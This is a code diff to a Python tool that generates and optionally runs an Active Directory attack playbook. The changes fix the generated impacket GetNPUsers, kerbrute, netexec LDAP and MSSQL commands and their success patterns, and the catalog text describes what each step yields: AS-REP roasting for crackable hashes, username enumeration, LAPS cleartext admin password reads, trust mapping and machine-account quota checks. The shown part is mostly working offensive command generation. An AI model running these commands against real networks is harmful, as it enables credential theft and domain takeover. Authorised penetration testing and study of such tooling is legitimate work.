@@ -341,7 +341,7 @@ def build_catalog():
            "Any user with 'Do not require Kerberos preauth' yields a crackable hash with zero creds.",
            lambda st: st.have_username,
            lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
-                       f"{st.domain or '<domain>'}/ -no-pass -usersfile {userlist(st)} "
+                       f"{getnpusers_target(st)} -no-pass "
                        f"{dcflag(st)} -format hashcat -outputfile asrep.hashes"),
            tool=impacket("GetNPUsers"),
            success=re.compile(r"\$krb5asrep\$", re.I)))
@@ -350,8 +350,7 @@ def build_catalog():
            "No creds > Kerberos > username validation",
            "Validates which guessed/harvested usernames exist, via Kerberos pre-auth, without failed logons.",
            lambda st: st.have_username,
-           lambda st: (f"kerbrute userenum -d {st.domain or '<domain>'} "
-                       f"--dc {st.dc_ip} {userlist(st)}"),
+           lambda st: kerbrute_cmd(st),
            tool="kerbrute"))
 
     A(Tech("pre2k", P_FOOTHOLD, "pre-Windows-2000 computer accounts", ENUM, 3,
@@ -418,7 +417,7 @@ def build_catalog():
            "No password needed; crack offline with hashcat -m 18200.",
            lambda st: st.have_username and not st.have_creds,
            lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
-                       f"{st.domain or '<domain>'}/ -no-pass -usersfile {userlist(st)} "
+                       f"{getnpusers_target(st)} -no-pass "
                        f"{dcflag(st)} -format hashcat"),
            tool=impacket("GetNPUsers"),
            success=re.compile(r"\$krb5asrep\$", re.I)))
@@ -481,7 +480,7 @@ def build_catalog():
            "Creds > LDAP > object property mining",
            "Finds unconstrained/constrained delegation, passwords-in-description, AS-REP/SPN flags.",
            lambda st: st.have_creds,
-           lambda st: (f"{nxc} ldap {st.target} {st.nxc_auth()} "
+           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} "
                        f"--trusted-for-delegation --password-not-required "
                        f"--admin-count --users"),
            tool=nxc_bin()))
@@ -491,9 +490,13 @@ def build_catalog():
            "Any principal with the LAPS read right gets a machine's local Administrator password in "
            "cleartext - instant local admin, and often the same reader covers many hosts.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
            tool=nxc_bin(),
-           success=re.compile(r"AdmPwd|Password|Administrator", re.I)))
+           # Require a recovered value (label + ':'/'=' + a real secret), not the
+           # bare words "Password"/"Administrator" - those appear in nxc's status
+           # lines and benign LDAP fields ("Password Last Set:", a computer owner)
+           # and falsely "confirmed" LAPS with nothing read. Mirrors reconx's rule.
+           success=re.compile(r"(ms-?Mcs-?AdmPwd|LAPS|Password|Administrator)\s*[:=]\s*\S{6,}", re.I)))
 
     A(Tech("gmsa", P_CREDS, "Read gMSA managed passwords", ENUM, 1,
            "Creds > LDAP > msDS-ManagedPassword / gMSA",
@@ -530,7 +533,9 @@ def build_catalog():
            "Trusts open escalation to other domains - map them early; a child->parent edge is a "
            "reliable route to Enterprise Admin.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M enum_trusts",
+           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} "
+                       f"--query \"(objectClass=trustedDomain)\" "
+                       f"\"flatName trustPartner trustDirection trustType trustAttributes\""),
            tool=nxc_bin(),
            success=re.compile(r"trust|Parent|Child|Forest", re.I)))
 
@@ -594,7 +599,7 @@ def build_catalog():
            "Creds > LDAP > ms-DS-MachineAccountQuota",
            "If MAQ > 0 any user can add a computer account - the pivot both RBCD and noPac rely on.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} ldap {st.target} {st.nxc_auth()} -M maq",
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M maq",
            tool=nxc_bin(),
            success=re.compile(r"MachineAccountQuota", re.I)))
 
@@ -676,7 +681,7 @@ def build_catalog():
            "Domain creds frequently log into MSSQL; check for sysadmin, EXECUTE AS impersonation, "
            "and linked servers you can hop with EXECUTE AT - all classic AD pivots.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M mssql_priv",
+           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M enum_impersonate",
            tool=nxc_bin(),
            success=re.compile(r"\[\+\]|sysadmin|Pwn3d|Linked", re.I)))
 
@@ -777,12 +782,40 @@ def domain_dn(st):
 
 
 def userlist(st):
-    """A path to a username list for spray/roast commands."""
+    """A username argument for tools that accept EITHER a file or a bare name
+    (e.g. netexec's `-u`). Not for tools whose argument must be a file - use
+    getnpusers_target() / kerbrute_cmd() for those."""
     if st.users_file:
         return shlex.quote(st.users_file)
     if st.user:
         return shlex.quote(st.user)      # a single user is still valid input
     return "users.txt"
+
+
+def getnpusers_target(st):
+    """Target expression for impacket-GetNPUsers. `-usersfile` must be a real
+    file, so a single held username is passed inline as `domain/user` instead
+    (both forms are documented impacket usage)."""
+    dom = st.domain or "<domain>"
+    if st.users_file:
+        return f"{dom}/ -usersfile {shlex.quote(st.users_file)}"
+    if st.user:
+        return f"{dom}/{shlex.quote(st.user)}"
+    return f"{dom}/ -usersfile users.txt"
+
+
+def kerbrute_cmd(st):
+    """kerbrute userenum's positional argument is a username *wordlist file*,
+    not a bare name. For a single held username, stage a one-line file first
+    (kept to a single shell line so --run's no-newline guard still runs it)."""
+    dom = st.domain or "<domain>"
+    if st.users_file:
+        return f"kerbrute userenum -d {dom} --dc {st.dc_ip} {shlex.quote(st.users_file)}"
+    if st.user:
+        f = "/tmp/admap_users.txt"
+        return (f"printf '%s\\n' {shlex.quote(st.user)} > {f} && "
+                f"kerbrute userenum -d {dom} --dc {st.dc_ip} {f}")
+    return f"kerbrute userenum -d {dom} --dc {st.dc_ip} users.txt"
 
 
 def bloodhound_cmd(st):
@@ -837,7 +870,7 @@ async def run_enum(tech, st, outdir, timeout):
     info(f"run {C.BOLD}{tech.tid}{C.END}: {C.DIM}{cmd}{C.END}")
     rc, out = await _run(cmd, timeout)
     if outdir:
-        path = os.path.join(outdir, f"admap_{tech.tid}.txt")
+        path = os.path.join(outdir, f"admap_{tech.tid}_{identity_slug(st)}.txt")
         try:
             with open(path, "w") as fh:
                 fh.write(f"$ {cmd}\n\n{out}")
@@ -966,6 +999,23 @@ def default_outdir(st):
     return os.getcwd()
 
 
+def identity_slug(st):
+    """A filesystem-safe tag for the identity this run used, so repeated runs
+    against the same host with different credentials don't clobber each other's
+    output. Keyed on the username (or userlist / anon), with a .local marker so
+    a local account and a domain account of the same name stay distinct."""
+    if st.user:
+        base = st.user
+    elif st.users_file:
+        base = "list-" + os.path.splitext(os.path.basename(st.users_file))[0]
+    else:
+        return "anon"
+    slug = re.sub(r"[^A-Za-z0-9._-]", "_", base).strip("._") or "id"
+    if st.local_auth:
+        slug += ".local"
+    return slug
+
+
 # --------------------------------------------------------------------------- #
 #  CLI
 # --------------------------------------------------------------------------- #
@@ -1031,12 +1081,15 @@ async def amain(argv):
     except OSError:
         outdir = os.getcwd()
 
+    slug = identity_slug(st)
+    md_path = os.path.join(outdir, f"ad_playbook_{slug}.md")
     if not args.no_md:
-        write_markdown(cat, st, os.path.join(outdir, "ad_playbook.md"))
+        write_markdown(cat, st, md_path)
 
     if args.run and not args.dry_run:
         print()
-        info(f"--run: executing [ENUM] steps only, output -> {outdir}")
+        info(f"--run: executing [ENUM] steps only, output -> {outdir} "
+             f"(tagged '{slug}')")
         # Iterate; _learn() may flip state, so recompute applicability each loop.
         ran = set()
         progressed = True
@@ -1055,7 +1108,7 @@ async def amain(argv):
         good("--run complete. Re-rendering with what we learned:\n")
         render(cat, st)
         if not args.no_md:
-            write_markdown(cat, st, os.path.join(outdir, "ad_playbook.md"))
+            write_markdown(cat, st, md_path)
     elif not args.run:
         print(f"\n{C.DIM}Tip: add --run to auto-execute the [ENUM] steps "
               f"(read-only).{C.END}")
